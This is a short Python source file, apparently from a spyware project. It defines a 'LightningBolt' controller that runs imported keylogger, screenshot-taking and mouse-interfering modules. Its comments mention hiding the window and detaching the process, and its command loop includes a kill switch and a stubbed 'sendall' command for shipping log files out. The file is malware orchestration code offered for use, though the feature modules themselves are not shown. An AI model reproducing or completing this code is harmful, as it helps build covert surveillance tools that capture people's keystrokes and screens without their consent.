from typing import List
from os import _exit

from keylogger import KeyLogger
from pogan_feature import PoganFeature
from screenshot_taker import ScreenshotTaker
from mouse_fiddler import MouseFiddler


class LightningBolt:
    def __init__(self, filename='log.txt', log_dir='.'):
        self.features: List[PoganFeature] = []
        self.features.append(KeyLogger(filename, log_dir))
        self.features.append(ScreenshotTaker('scrn.png', filename, log_dir, log=False))
        self.features.append(MouseFiddler(filename, log_dir, fistun_level=0, log=False))

    def run(self):
        # hide window
        # run driver that detach process

        for feature in self.features:
            feature.run()

        while True:
            print('$', end=' ')

            cmd = input()
            if cmd == 'exit' or cmd == 'kill':
                self.kill_switch()
                _exit(1)
            elif cmd == 'sendall':
                # Send all log files
                pass

    def kill_switch(self):
        for feature in self.features:
            feature.clean()
